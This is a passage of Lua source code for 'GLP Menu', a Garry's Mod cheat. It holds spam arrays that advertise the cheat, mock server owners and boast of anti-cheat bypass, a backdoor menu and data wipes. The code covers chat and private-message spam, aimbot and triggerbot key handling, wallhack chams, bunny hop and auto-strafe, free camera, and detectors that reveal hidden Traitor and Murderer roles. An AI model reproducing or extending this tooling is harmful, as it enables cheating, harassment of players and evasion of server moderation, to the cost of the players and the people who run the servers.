	"[GLP Menu] - Too bad you cant get this Rework LOL",
	"[GLP Menu] - Bug-free and fully customizable!",
	"[GLP Menu] - Our Steam group is down, so join our Discord server to stay up-to-date!",
	"[GLP Menu] - Yea ScreenGrab nah i dont think so...",
	"[GLP Menu] - Now with Extra features than ever!",
	"[GLP Menu] - GLP Menu Beats Sucky AntiCheats and ScreenGrabs",
	"[GLP Menu] - Bypasses most anti-cheats and screen grabbers!",
}

local toxicadvertise = {
	"GLP is made by LMC and We dont care what you think ;)",
	"GLP Pretty much Owns you guys sooo yea",
	"Maybe if you download GLP you will have Fun on Garry's Mod?",
	"If your thinking your gonna stop GLP maybe you should think again",
	"Ok yea Any Admins on Here should give up your Dumpster AC isnt gonna stop GLP...",
	"GLP has High Quality Setup and is always changing just to tick off Gmod Staff ;P",
	"Darn all you Legit's are just Plain Trash",
	"If you want to Get good you will get GLP *Creation is Perfection",
	"If your mad because of Cheats Blame yourself because your on a Unsecure Server LOL",
	"This is why you dont spend your moms remaining 25$ on a Broken Garry's Mod Server...",
	"GLP Knows you spend like 25$ on a Custom Class but were just gonnah have to DataWipe",
	"Hope you like the Server after it gets Data Wiped LOL",
	"Yea GLP had Backdoor Menu and that means it can Ban you Scrubs so SHUT UP!...",
	"With GLP you can Pretty Much Give yourself Superadmin and Ban the Server Owners",
	"GLP Can Even Bypass Most AntiCheats and has a Backdoor Menu",
	"Use GLP Its probably one of the Best Cheats out there",
	"The GLP Developers are Really Quite The BEST...",
	"Yes LUA Scripting is Remarkably Easy LOL",
	"Yea No need to Thank GLP they have Helped make your gave twice as Fun...",
	"Ha some of you dont have GLP and for that your straight TRASH",
	"You Can get Free GLP or heck obtain PREMIUM through purchase Either way...Great Cheats",
	"GLP has Chams,Glow,Aimbot,SpinBot man Features can go on and on and on....",
	"GLP is Quite the Cheat...",
	"GLP is Brilliant...just Brilliant...",
	"GET OWNED This Shows GLP is Best",
	"GLP Is Almost Always Getting Updates",
	"Have GLPBot installed if you're The Best...",
	"Whoever says LuaCheats are Bad are Just plain IDIOTS",
	"You get GLPBot, everyone else on the server gets pwned, ez as Pie",
	"GLPBot, Might have CopyCats Download Original to be Cool",
	"Download GLP and then you probably wont get REKT",
	"You BETTER Download GLP at www.lmccoding.weebly.com",
	"Join GLP's Community to not get Demolished",
}

local lmaoboxadvertise = {
	"[GLP] - GLP is Best",
	"[GLP] - You want this Cheat...TOO BAD :)",
	"[GLP] - Your Money is well spent on a Server thats Literally Defenseless",
	"[GLP] - Watch Malicious guys come on and ban all of you Players then you lose your items ;)",
	"[GLP] - NO SKILL REQUIRED!",
	"[GLP] - NEVER DIE AGAIN WITH THIS!",
	"[GLP] - Only the Intelligent dont buy Free addons on Servers",
	"[GLP] - THE GAME IS NOT ACTUALLY DYING, I JUST LIKE TO ANNOY KIDS LOL!",
	"[GLP] - GET OWNED KIDS",
	"[GLP] - Love how u all just get Destroyed",
	"[GLP] - GUARENTEED TO ROLL U ALL :D",
	"[GLP] - Your just Destroyed....",
	"[GLP] - Yea This is Great...",
	"[GLP] - Ahhh you OWNED",
	"[GLP] - Literally Server VIP without paying a Dime",
	"[GLP] - 100% NO SKILL REQUIRED!",
	"[GLP] - How are u all So ez to beat",
	"[GLP] - Playing with one hand suckers",
	"[GLP] - HAHAHAHAHAH",
	"[GLP] - No GLPes to LOL",
	"[GLP] - How are u all this Angry",
	"[GLP] - GLP is the Best",
	"[GLP] - Wow a Server got Hacked on Noice",
	"[GLP] - This Server seems not to have anything actually defending players thats Funny...",
	"[GLP] - Dudes Spend money on literally anything else maybe light your money on fire if u want to buy Servers Addons LOL"
}

local linkspamv2 = {
	"[GLP] - GLP Menu Cheat is Great Cheat",
	"[GLP] - Destroying everyone since '5.",
	"[GLP] - Easy to use, free Garry's Mod cheat.",
	"[GLP] - Now you can forget that negative KD's can be possible.",
	"[GLP] - Beats all Admins :).",
	"[GLP] - GLP Menu Download Today..OH WAIT u cant HA.",
	"[GLP] - GLP Menu Reworked Cheat Brillaint...",
	"[GLP] - The only high-quality free cheat, out for Garry's Mod.",
	"[GLP] - ????",
	"[GLP] - Always updated, never dead.",
	"[GLP] - A highly reliable and optimised cheating software.",
	"[GLP] - Top class, free cheat for Garry's Mod.",
	"[GLP] - Makes noobs cry waves of tears since forever!",
	"[GLP] - Say goodbye to the rFakeAnglesawn room!",
	"[GLP] - Download the highest quality Garry's Mod cheat for free now!",
	"[GLP] - A reliable way to go!",
	"[GLP] - Ha Owned by Skelnton Key",
	"[GLP] - Monthly bugfixes & updates. It never gets outdated!",
	"[GLP] - Too bad you cant get this Rework LOL",
	"[GLP] - Bug-free and fully customizable!",
	"[GLP] - Our Steam group is down, so join our Discord server to stay up-to-date!",
	"[GLP] - Yea ScreenGrab nah i dont think so...",
	"[GLP] - Now with Extra features than ever!",
	"[GLP] - GLP Menu Beats Sucky AntiCheats and ScreenGrabs",
	"[GLP] - Bypasses most anti-cheats and screen grabbers!",
}


	if(gOption("Extra", "Chat", "Chat Spam:") == "Advertising 1") then
		RunConsoleCommand("say", advertise[math.random(#advertise)])
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "linkspamv2") then
		RunConsoleCommand("say", advertise[math.random(#linkspamv2)])
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "Advertising 2") then
		RunConsoleCommand("say", lmaoboxadvertise[math.random(#lmaoboxadvertise)])
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "Advertising 3") then
        RunConsoleCommand("say", toxicadvertise[math.random(#toxicadvertise)])
    end
	if(gOption("Extra", "Chat", "Chat Spam:") == "Russian Spam") then
        RunConsoleCommand("say", RUSSIan[math.random(#RUSSIan)])
    end 
	if(gOption("Extra", "Chat", "Chat Spam:") == "%0 Builder") then
        RunConsoleCommand("say", ArabFunni[math.random(#ArabFunni)])
    end 
	if(gOption("Extra", "Chat", "Chat Spam:") == "Link Spam") then
		RunConsoleCommand("say", "www.lmccoding.weebly.com")
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "Clear Chat") then
		ChatClear.Run()
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "/OOC Clear Chat") then
		ChatClear.OOC()
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "Offensive Spam") then
		RunConsoleCommand("say", offensivFakeAnglesam[math.random(#offensivFakeAnglesam)])
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "Drop Money") then
		RunConsoleCommand("say", "/dropmoney "..math.random(2, 10))
	end
	if(gOption("Extra", "Chat", "Chat Spam:") == "ULX RconFAKE") then
		local v = player.GetAll()[math.random(#player.GetAll())]
		if (v != me && v:GetFriendStatus() != "friend" && !pm.IsAdmin(v) && !table.HasValue(ignore_list, v:UniqueID())) then
			LocalPlayer():ConCommand("ulx psay \"".. v:Nick() .."\" "..messagFakeAnglesam[math.random(#messagFakeAnglesam)])
		end
	end
end

local function ChangeLog()
	print("===========================================================\n\n")
	print("[GLP FREE])")
	print("GLP FoVCircle Fix)")
	print("fixed ESP)")
	print("\n\n===========================================================")
end

concommand.Add("glb_updatelog", ChangeLog)

concommand.Add("glb_menustart", function()
	menuopen = true
	menukeydown = true
	Menu()
end)

CreateClientConVar("glb_namechanger", "GLP USER | FREE", true, false)

local namechangeTime = 0

local randomemote = {
	"dance", 
	"muscle", 
	"wave", 
	"robot", 
	"bow", 
	"cheer", 
	"laugh", 
	"zombie", 
	"agree", 
	"disagree", 
	"forward", 
	"becon", 
	"salute", 
	"pose", 
	"halt", 
	"group", 
}

local function Filter(v)
	if(gConn("ESP", "Extra", "Distance Limit")) then
		local dist = gConn("ESP", "Extra", "Distance:")
			if(vm.Distance(em.GetPos(v), em.GetPos(me)) > (dist * 5)) then return false end
		end
	return true
end

local function EnemyFilter(v)
	local friendstatus = pm.GetFriendStatus(v)
	if friendstatus == "friend" then return true end
	local enemy = gConn("ESP", "Extra", "Show Enemies Only")
	if(enemy) then
		if(pm.Team(v) == pm.Team(me)) then return false end
	end
	return true
end

local function GetChamsColor(v)
    if(pm.Team(v) == pm.Team(me)) then
		local r = gInt("Home", "Team Chams Color", "Red:")
		local g = gInt("Home", "Team Chams Color", "Green:")
		local b = gInt("Home", "Team Chams Color", "Blue:")
		return(Color(r, g, b, 220))
    end
		local r = gInt("Home", "Enemy Chams Color", "Red:")
		local g = gInt("Home", "Enemy Chams Color", "Green:")
		local b = gInt("Home", "Enemy Chams Color", "Blue:")
    return(Color(r, g, b, 220))
end

local chamsmat = CreateMaterial("a", "VertexLitGeneric", {
	["$ignorez"] = 1, 
	["$model"] = 0, 
	["$basetexture"] = "models/debug/debugwhite", 
})

local chamsmat2 = CreateMaterial("@", "VertexLitGeneric", {
	["$ignorez"] = 0, 
	["$model"] = 1, 
	["$basetexture"] = "models/debug/debugwhite", 
})

local function Chams(v)
	if(gConn("ESP", "Wallhack", "Playermodel Chams") && !gConn("ESP", "Wallhack", "Chams")) then
	cam.Start3D()
		cam.IgnoreZ(true)
		em.DrawModel(v)
		cam.IgnoreZ(false)
	cam.End3D()
end
	
if(gConn("ESP", "Wallhack", "Chams")) then
local col = gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || GetChamsColor(v)
	local wep = v:GetActiveWeapon()
	if wep:IsValid() then
	cam.Start3D()
	render.MaterialOverride(chamsmat)
	render.SetColorModulation(col.r/255, col.g/255, col.b/255, 255)
	em.DrawModel(wep)
	render.SetColorModulation(col.r/170, col.g/170, col.b/170, 255)
	render.MaterialOverride(chamsmat2)
	em.DrawModel(wep)
	cam.End3D()
	end
	cam.Start3D()
	render.MaterialOverride(chamsmat)
	render.SetColorModulation(col.b / 255, col.r / 255, col.g / 255)
	em.DrawModel(v)
	render.SetColorModulation(col.r / 255, col.g / 255, col.b / 255)
	render.MaterialOverride(chamsmat2)
	em.DrawModel(v)
	render.SetColorModulation(1, 1, 1)
	cam.End3D()
	end
end

local function AimKeyCheck()
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "None") then
		return true
	end
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "Mouse 3") then
		if input.IsMouseDown(109) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "Mouse 4") then
		if input.IsMouseDown(110) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "Mouse 5") then
		if input.IsMouseDown(111) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "Mouse 6") then
		if input.IsMouseDown(112) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "Left 'ALT' Key") then
		if input.IsKeyDown(KEY_LALT) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'E' Key") then
		if input.IsKeyDown(15) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'F' Key") then
		if input.IsKeyDown(KEY_F) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'G' Key") then
		if input.IsKeyDown(KEY_G) then return true end
	end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'B' Key") then
		if input.IsKeyDown(KEY_B) then return true end
        end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'C' Key") then
		if input.IsKeyDown(KEY_C) then return true end
	end
end

local function AimKeyCheck2()
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "None") then
		return true
	end
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "Mouse 3") then
		if input.IsMouseDown(109) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "Mouse 4") then
		if input.IsMouseDown(110) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "Mouse 5") then
		if input.IsMouseDown(111) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "Mouse 6") then
		if input.IsMouseDown(112) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "Left 'ALT' Key") then
		if input.IsKeyDown(KEY_LALT) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "The 'E' Key") then
		if input.IsKeyDown(15) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "The 'F' Key") then
		if input.IsKeyDown(KEY_F) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "The 'G' Key") then
		if input.IsKeyDown(KEY_G) then return true end
	end
	if(gConn("Aimbot", "Legitbot", "Aim-Key:") == "The 'B' Key") then
		if input.IsKeyDown(KEY_B) then return true end
        end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'C' Key") then
		if input.IsKeyDown(KEY_C) then return true end
	end
end

local function TriggerKeyCheck()
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "None") then
		return true
	end
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "Mouse 3") then
		if input.IsMouseDown(109) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "Mouse 4") then
		if input.IsMouseDown(110) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "Mouse 5") then
		if input.IsMouseDown(111) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "Mouse 6") then
		if input.IsMouseDown(112) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "Left 'ALT' Key") then
		if input.IsKeyDown(KEY_LALT) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "The 'E' Key") then
		if input.IsKeyDown(15) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "The 'F' Key") then
		if input.IsKeyDown(KEY_F) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "The 'G' Key") then
		if input.IsKeyDown(KEY_G) then return true end
	end
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "The 'B' Key") then
		if input.IsKeyDown(KEY_B) then return true end
        end
	if(gConn("Aimbot", "Ragebot", "Aim-Key:") == "The 'C' Key") then
		if input.IsKeyDown(KEY_C) then return true end
	end
end

local function PropKeyCheck()
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if not me:GetActiveWeapon():IsValid() or me:GetActiveWeapon():GetClass() ~= "weapon_zm_carry" then return false end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "Mouse 3") then
		if input.IsMouseDown(109) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "Mouse 4") then
		if input.IsMouseDown(110) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "Mouse 5") then
		if input.IsMouseDown(111) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "Mouse 6") then
		if input.IsMouseDown(112) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "Left 'ALT' Key") then
		if input.IsKeyDown(KEY_LALT) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "The 'E' Key") then
		if input.IsKeyDown(15) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "The 'F' Key") then
		if input.IsKeyDown(KEY_F) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "The 'G' Key") then
		if input.IsKeyDown(KEY_G) then return true end
	end
	if(gConn("Utilities", "Utilities", "TTT: Prop Kill-Key:") == "The 'B' Key") then
		if input.IsKeyDown(KEY_B) then return true end
	end
end

local function CamKeyCheck()
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "Mouse 3") then
		if input.IsMouseDown(109) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "Mouse 4") then
		if input.IsMouseDown(110) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "Mouse 5") then
		if input.IsMouseDown(111) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "Mouse 6") then
		if input.IsMouseDown(112) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "Left 'ALT' Key") then
		if input.IsKeyDown(KEY_LALT) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "The 'E' Key") then
		if input.IsKeyDown(15) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "The 'F' Key") then
		if input.IsKeyDown(KEY_F) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "The 'G' Key") then
		if input.IsKeyDown(KEY_G) then return true end
	end
	if(gConn("ESP", "Extra", "Free Camera-Key:") == "The 'B' Key") then
		if input.IsKeyDown(KEY_B) then return true end
	end
end

local function SwitchKeyCheck()
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "Mouse 3") then
		if input.IsMouseDown(109) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "Mouse 4") then
		if input.IsMouseDown(110) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "Mouse 5") then
		if input.IsMouseDown(111) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "Mouse 6") then
		if input.IsMouseDown(112) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "Left 'ALT' Key") then
		if input.IsKeyDown(KEY_LALT) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "The 'E' Key") then
		if input.IsKeyDown(15) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "The 'F' Key") then
		if input.IsKeyDown(KEY_F) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "The 'G' Key") then
		if input.IsKeyDown(KEY_G) then return true end
	end
	if(gConn("FakeAngles", "FAKEAngles)", "Switch-Key:") == "The 'B' Key") then
		if input.IsKeyDown(KEY_B) then return true end
	end
end

local FreeCam, FreeCam2
	
function GLPBot.FreeCamSetup()
	if not (gConn("ESP", "Extra", "Free Camera")) then return end
	if not (gConn("Extra", "ViewModel", "Enabled")) then return end
	if gConn("Extra", "Extra", "Thirdperson") then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if (CamKeyCheck()) then
		if not FreeCam then
			FreeCam = true
			FreeCam2 = not FreeCam2
			if FreeCam2 and not CamPos then
				CamPos = ply:GetShootPos()
			end
			if FreeCam2 then
				CamAng = ply:EyeAngles()
			end
		end
	else
		FreeCam = false
	end
end

function GLPBot.FreeCamMove(pCmd)
	if not (gConn("ESP", "Extra", "Free Camera")) then return end
	if not (gConn("Extra", "ViewModel", "Enabled")) then return end
	if gConn("Extra", "Extra", "Thirdperson") then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if FreeCam then
		local ang = ply:EyeAngles()
		CamPos = CamPos + (ang:Forward() * pCmd:GetForwardMove() / 10000 + ang:Right() * pCmd:GetSideMove() / 10000 + ang:Up() * pCmd:GetUpMove() / 10000) * (pCmd:KeyDown(IN_SPEED) and 10 or 3)
		if (pCmd:KeyDown(IN_RELOAD)) then
			CamPos = ply:GetShootPos()
			CamAng = ply:EyeAngles()
		end
		pCmd:SetButtons(0)
		pCmd:SetForwardMove(0)
		pCmd:SetSideMove(0)
		pCmd:SetUpMove(0)
	end
end

local function BunnyHop(pCmd)
	if(not gConn("Extra", "Movement", "Bunny Hop") or em.GetMoveType(me) == MOVETYPE_NOCLIP or LocalPlayer():IsFlagSet(1024) or me:Team() == TEAM_SPECTATOR or me:Health() < 1 or not me:Alive() or gConn("Extra", "ViewModel", "Enabled") && gConn("ESP", "Extra", "Free Camera") && CamKeyCheck() && !gConn("Extra", "Extra", "Thirdperson")) then return end
	if(!me:IsOnGround() && pCmd:KeyDown(IN_JUMP)) then
		pCmd:RemoveKey(IN_JUMP)
		if(gConn("Extra", "Movement", "Auto Strafe")) then
			if(pCmd:GetMouseX() > 1 || pCmd:GetMouseX() < - 1) then
				pCmd:SetSideMove(pCmd:GetMouseX() > 1 && 10000 || - 10000)
			else
				pCmd:SetForwardMove(10000 / me:GetVelocity():Length2D())
				pCmd:SetSideMove((pCmd:CommandNumber() % 2 == 0) && - 10000 || 10000)
			end
		end
	elseif(pCmd:KeyDown(IN_JUMP) && gConn("Extra", "Movement", "Auto Strafe")) then
		pCmd:SetForwardMove(10000)
	end
end

function GLPBot.AirCrouch(pCmd)
	if em.GetMoveType(me) == MOVETYPE_NOCLIP then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if LocalPlayer():IsFlagSet(1024) then return end
	if gConn("Extra", "ViewModel", "Enabled") && gConn("ESP", "Extra", "Free Camera") && CamKeyCheck() && !gConn("Extra", "Extra", "Thirdperson") then return end
	if(gConn("Extra", "Movement", "Air Crouch")) then
	local pos = ply:GetPos()
	local trace = {
		start = pos, 
		endpos = pos - GLPBot.Vector(0, 0, 50), 
		mask = MASK_PLAYERSOLID, 
	}
	local trace = util.TraceLine(trace)
	local height = (pos - trace.HitPos).z
	if (height > 25 and 50 > height) then
		pCmd:SetButtons(pCmd:GetButtons() + IN_DUCK)
		end
	end
end

function GLPBot.TraitorDetector()
	if (GLPBot.engine.ActiveGamemode() ~= "terrortown") then return end
	if(gConn("ESP", "Extra", "Traitor Finder")) then
	for k, v in GLPBot.ipairs(GLPBot.ents.GetAll()) do
		local _v = v:GetOwner()
		if (_v == ply) then continue end
		if (GLPBot.GetRoundState() == 3 and v:IsWeapon() and _v:IsPlayer() and not _v.Detected and GLPBot.table.HasValue(v.CanBuy, 1)) then
			if (_v:GetRole() ~= 2) then
				_v.Detected = true
				MsgY(4.3, _v:Nick().. " is a Traitor. He just bought: " ..v:GetPrintName())
				surface.PlaySound("npc/scanner/combat_scan1.wav")
			end
		elseif (GLPBot.GetRoundState() ~= 3) then
				v.Detected = false
			end
		end
	end
end

function GLPBot.MurdererDetector()
	if not (gConn("ESP", "Extra", "Murderer Finder")) then return end
	if (GLPBot.engine.ActiveGamemode() ~= "murder") then return end
	for k, v in GLPBot.ipairs(GLPBot.player.GetAll()) do
		if (v == ply) then continue end
		if (GAMEMODE.RoundStage == 1 and not v.Detected and not v.Magnum) then
			if (v:HasWeapon("weapon_mu_knife")) then
				v.Detected = true
				MsgY(4.3, (v:Nick() .. " (" .. v:GetNWString("bystanderName") .. ") is the murderer."))
				surface.PlaySound("buttons/lightswitch2.wav")
			end
			if (v:HasWeapon("weapon_mu_magnum")) then
				v.Magnum = true
				timer.Create("ChatPrint", 4.8, 1, function() MsgY (4.3, (v:Nick() .. " (" .. v:GetNWString("bystanderName") .. ") has a magnum.")) end)
				timer.Create("PlaySound", 4.8, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
			else
				v.Magnum = false
			end
		elseif (GAMEMODE.RoundStage ~= 1) then
			v.Detected = false
			v.Magnum = false
		end
	end
end

local function Think()
	if ((input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_F5)) and not menuopen and not menukeydown) then
		menuopen = true
		menukeydown = true
		Menu()
	elseif (not (input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_F5)) and not menuopen) then
		menukeydown = false
	end
	if ((input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_F5)) and menukeydown and menuopen) then
		menukeydown2 = true
	else
		menukeydown2 = false
	end
	if (gConn("Extra", "Chat", "Enable Spams") && gOption("Extra", "Chat", "Chat Spam:") ~= "Off") then
		ChatSpam()
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Dance") then
		RunConsoleCommand("act", "dance")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Sexy") then
		RunConsoleCommand("act", "muscle")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Wave") then
		RunConsoleCommand("act", "wave")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Robot") then
		RunConsoleCommand("act", "robot")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Bow") then
		RunConsoleCommand("act", "bow")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Cheer") then
		RunConsoleCommand("act", "cheer")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Laugh") then
		RunConsoleCommand("act", "laugh")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Zombie") then
		RunConsoleCommand("act", "zombie")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Agree") then
		RunConsoleCommand("act", "agree")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Disagree") then
		RunConsoleCommand("act", "disagree")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Forward") then
		RunConsoleCommand("act", "forward")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Back") then
		RunConsoleCommand("act", "becon")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Salute") then
		RunConsoleCommand("act", "salute")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Pose") then
		RunConsoleCommand("act", "pers")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Halt") then
		RunConsoleCommand("act", "halt")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Group") then
		RunConsoleCommand("act", "group")
	end
	if(gConn("Extra", "Extra", "Emotes") && gOption("Extra", "Extra", "Emote Type:") == "Random") then
		RunConsoleCommand("act", randomemote[math.random(#randomemote)])
	end
	if(gConn("Extra", "Extra", "Flashlight Spam")) then
		RunConsoleCommand("impulse", "100")
	end
	if(gConn("Utilities", "GLP Menu Console Commands", "Apply custom name")) then
		hook.Add("Think", "Hook7", function()
		GLPBotC.ChangeName(GetConVarString("glb_namechanger"))
		if not Confirmed1 then
		MsgG(3.2, "Successfully applied custom name.")
		surface.PlaySound("buttons/lightswitch2.wav")
		Confirmed1 = true
		end
		end)
	end
end

local function HookExist(name, identifier)
    for k, v in pairs(hook.GetTable()) do
        if k == name then
            for a, b in pairs(v) do
                if a == identifier then
                    return true
                end
            end
            return false
        end
    end
end

local displayed = false

local blackscreen = false

local footprints = false

local looped_props = false

local tauntspam = {
	"funny", 
	"help", 
	"scream", 
	"morose", 
}

local function CheckChild(pan)
	if (pan and pan:IsValid() and not menuopen and not me:IsTyping() and not gui.IsGameUIVisible() and not gui.IsConsoleVisible() and not (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible())) then
		removewindow = true
		if input.IsKeyDown(17) then
			if pan.GetTitle then
				MsgR(4.3, "GLPBotC successfully removed \""..pan:GetTitle().."\".")
				surface.PlaySound("buttons/lightswitch2.wav")
			end
			pan:Remove()
			return
		end
		for k, v in pairs(pan:GetChildren()) do
			if input.IsKeyDown(17) then
				if v.GetTitle then
					MsgR(4.3, "GLPBotC successfully removed \""..v:GetTitle().."\".")
					surface.PlaySound("buttons/lightswitch2.wav")
				end
				v:Remove()
				return
			end
			if #v:GetChildren() > 0 then
				CheckChild(v)
			end
		end
	else
		if removewindow then
			removewindow = false
		end
	end
end

hook.Add("Think", "Hook8", function()
	GLPBot.PlayerCheck()
	GLPBot.TraitorDetector()
	GLPBot.MurdererDetector()
	GLPBot.FreeCamSetup()
	Think()
